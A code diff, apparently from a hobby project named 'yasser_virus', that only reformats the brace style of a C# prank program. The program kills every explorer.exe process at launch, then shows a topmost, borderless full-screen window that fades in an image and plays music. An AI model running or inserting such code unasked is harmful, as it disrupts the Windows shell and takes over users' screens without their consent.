@@ -6,10 +6,10 @@ using System.Media;
 using System.Windows.Forms;
 using System.Threading;
 
-namespace yasser_virus
-{
-    public class Program : Form
-    {
+namespace yasser_virus {
+    
+    public class Program : Form {
+        
         private PictureBox pictureBox;
         private Timer fadeInTimer;
         private float opacity = 0;
@@ -17,24 +17,24 @@ namespace yasser_virus
         private float musicVolume = 0;
 
         [STAThread]
-        public static void Main()
-        {
-            foreach (var process in Process.GetProcessesByName("explorer"))
-            {
+        public static void Main() {
+            
+            foreach (var process in Process.GetProcessesByName("explorer")) {
+                
                 process.Kill();
             }
             Application.Run(new Program());
         }
 
-        public Program()
-        {
+        public Program() {
+            
             this.WindowState = FormWindowState.Maximized;
             this.FormBorderStyle = FormBorderStyle.None;
             this.BackColor = Color.Black;
             this.TopMost = true;
 
-            pictureBox = new PictureBox
-            {
+            pictureBox = new PictureBox {
+                
                 Image = Image.FromFile(@"C:\Users\Nikolay\Downloads\Save_webP\channels4_profile_jpg(1).png"),
                 Size = new Size(960, 960),
                 Location = new Point((Screen.PrimaryScreen.Bounds.Width - 960) / 2,
@@ -44,19 +44,19 @@ namespace yasser_virus
             };
             this.Controls.Add(pictureBox);
 
-            fadeInTimer = new Timer
-            {
+            fadeInTimer = new Timer {
+                
                 Interval = 50
             };
             fadeInTimer.Tick += FadeInTimer_Tick;
 
             player = new System.Media.SoundPlayer(@"C:\Users\Nikolay\Documents\yasser virus\spotifydown.com - Montagem Lunar Diamante - Slowed - DJ DYLANFK (mp3cut.net).wav");
 
-            new Thread(() =>
-            {
+            new Thread(() => {
+                
                 Thread.Sleep(1000);
-                this.Invoke((Action)(() =>
-                {
+                this.Invoke((Action)(() => {
+                    
                     pictureBox.Visible = true;
                     fadeInTimer.Start();
                     new Thread(PlayMusic).Start();
@@ -64,26 +64,26 @@ namespace yasser_virus
             }).Start();
         }
 
-        private void FadeInTimer_Tick(object sender, EventArgs e)
-        {
-            if (opacity < 1.0f)
-            {
+        private void FadeInTimer_Tick(object sender, EventArgs e) {
+            
+            if (opacity < 1.0f) {
+                
                 opacity += 0.05f;
                 pictureBox.Image = SetImageOpacity(pictureBox.Image, opacity);
             }
-            else
-            {
+            else {
+                
                 fadeInTimer.Stop();
             }
         }
 
-        private Image SetImageOpacity(Image image, float opacity)
-        {
+        private Image SetImageOpacity(Image image, float opacity) {
+            
             Bitmap bmp = new Bitmap(image.Width, image.Height);
-            using (Graphics gfx = Graphics.FromImage(bmp))
-            {
-                ColorMatrix matrix = new ColorMatrix
-                {
+            using (Graphics gfx = Graphics.FromImage(bmp)) {
+                
+                ColorMatrix matrix = new ColorMatrix {
+                    
                     Matrix33 = opacity
                 };
 
@@ -97,11 +97,11 @@ namespace yasser_virus
             return bmp;
         }
 
-        private void PlayMusic()
-        {
+        private void PlayMusic() {
+            
             player.Play();
-            while (musicVolume < 1.0f)
-            {
+            while (musicVolume < 1.0f) {
+                
                 musicVolume += 0.05f;
                 Thread.Sleep(100);
             }
